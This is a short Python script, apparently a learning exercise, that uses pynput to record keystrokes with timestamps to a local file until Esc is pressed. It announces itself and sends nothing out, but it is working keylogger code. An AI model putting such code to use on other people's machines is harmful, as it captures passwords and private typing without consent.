from pynput import keyboard
from datetime import datetime

def get_timestamp():
    """ Return formatted timestamp """
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    # .now() -> get the current date and time
    # .strftime -> string format method

def write_to_file(char):
    """ Write the captured char to a file with timestamp """
    with open("keylog_v2.txt", "a") as f:
        f.write(f"[{get_timestamp()}]:s {char}\n")

def on_press(key):
    try:
        write_to_file(f"Pressed: {key.char}")
    except AttributeError:
        write_to_file(f"Pressed: {key}")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(
    on_press=on_press,
    on_release=on_release
) as listener:
    print("Logging keystrokes to a file. Press esc to stop")
    listener.join()